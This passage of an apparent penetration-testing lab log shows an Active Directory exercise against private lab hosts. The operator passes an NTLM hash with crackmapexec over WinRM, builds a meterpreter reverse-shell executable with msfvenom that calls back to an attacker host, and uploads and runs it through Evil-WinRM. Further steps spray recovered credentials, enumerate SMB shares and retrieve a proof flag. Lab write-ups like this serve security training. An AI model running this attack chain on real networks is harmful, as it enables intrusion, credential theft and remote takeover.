-└─$ for i in 70 72 73 74 75 76; crackmapexec winrm 192.168.218.$i -u dave -H &#39;08d7a47a6f9f66b97b1bae4178747494&#39; -d corp.com --continue-on-success
-HTTP        192.168.218.70  5985   192.168.218.70   [*] http://192.168.218.70:5985/wsman
-WINRM       192.168.218.70  5985   192.168.218.70   [-] corp.com\dave:08d7a47a6f9f66b97b1bae4178747494
-HTTP        192.168.218.72  5985   192.168.218.72   [*] http://192.168.218.72:5985/wsman
-WINRM       192.168.218.72  5985   192.168.218.72   [-] corp.com\dave:08d7a47a6f9f66b97b1bae4178747494
-HTTP        192.168.218.73  5985   192.168.218.73   [*] http://192.168.218.73:5985/wsman
-WINRM       192.168.218.73  5985   192.168.218.73   [-] corp.com\dave:08d7a47a6f9f66b97b1bae4178747494
-HTTP        192.168.218.74  5985   192.168.218.74   [*] http://192.168.218.74:5985/wsman
-WINRM       192.168.218.74  5985   192.168.218.74   [+] corp.com\dave:08d7a47a6f9f66b97b1bae4178747494 (Pwn3d!)
-HTTP        192.168.218.75  5985   192.168.218.75   [*] http://192.168.218.75:5985/wsman
-WINRM       192.168.218.75  5985   192.168.218.75   [+] corp.com\dave:08d7a47a6f9f66b97b1bae4178747494 (Pwn3d!)
-
-#
-# Create Msfvenom executables on Kali
-#
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.163 LPORT=443 LURI=client75 -f exe -o client75.exe
-
-
-#
-# Upload via Evil-WinRM shells using dave hash
-#
-
-*Evil-WinRM* PS C:\Users\dave\Documents&gt; uplo
-ad /home/operator/OffSec/AD/client74.exe
-
-Info: Uploading /home/operator/OffSec/AD/client74.exe to C:\Users\dave\Documents\client74.exe
-
-Data: 277844 bytes of 277844 bytes copied
-
-Info: Upload successful!
-*Evil-WinRM* PS C:\Users\dave\Documents&gt; ls
-
-
-    Directory: C:\Users\dave\Documents
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----        12/28/2023   4:41 PM         208384 client74.exe
-
-
-*Evil-WinRM* PS C:\Users\dave\Documents&gt; .\client74
-
-#
-# Used meterpreter to get system on client74/75
-# retrieved cleartext password `Flowers1` for `dave` on client75
-# spray dave creds with crackmapexec smb, positive hit on web04
-# Use auxiliary smb_enumshares with creds on web04
-# Use auxiliary/admin/smb/download_file to get loot
-#
-
-msf6 auxiliary(scanner/smb/smb_enumshares) &gt; run
-
-[*] 192.168.218.72:139    - Starting module
-[-] 192.168.218.72:139    - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
-[*] 192.168.218.72:445    - Starting module
-[!] 192.168.218.72:445    - peer_native_os is only available with SMB1 (current version: SMB3)
-[!] 192.168.218.72:445    - peer_native_lm is only available with SMB1 (current version: SMB3)
-[+] 192.168.218.72:445    - ADMIN$ - (DISK|SPECIAL) Remote Admin
-[+] 192.168.218.72:445    - backup - (DISK)
-[+] 192.168.218.72:445    - C$ - (DISK|SPECIAL) Default share
-[+] 192.168.218.72:445    - IPC$ - (IPC|SPECIAL) Remote IPC
-[*] 192.168.218.72:445    - Skipping ADMIN$
-[+] 192.168.218.72:445    -  \\CORP\backup
-==============
-
- Type  Name                 Created                    Accessed                   Written                    Changed                    Size
- ----  ----                 -------                    --------                   -------                    -------                    ----
- FILE  backup_schemata.txt  2022-09-13T02:52:44-07:00  2022-09-13T02:52:44-07:00  2022-09-13T02:52:44-07:00  2022-09-14T03:01:20-07:00  0
- FILE  proof.txt            2023-12-28T13:44:32-08:00  2023-12-28T13:44:32-08:00  2023-12-28T13:44:32-08:00  2023-12-28T13:44:32-08:00  78
-
-[*] 192.168.218.72:445    - Skipping IPC$
-[+] 192.168.218.72:445    - info saved in: /home/operator/.msf4/loot/20231228201242_corp_192.168.218.72_smb.enumshares_713122.txt
-[*] 192.168.218.72:       - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-
-
-#
-# Loot
-#
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ cat /home/operator/.msf4/loot/20231228201242_corp_192.168.218.72_smb.enumshares_713122.txt
-192.168.218.72\backup\backup_schemata.txt
-192.168.218.72\backup\proof.txt
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ cat /home/operator/.msf4/loot/20231228202433_corp_192.168.218.72_smb.shares.file_149839.txt
-OS{f1f87930e1e4ea050afe969b08d6e0da}
-</code></pre>
 
   </div>
 
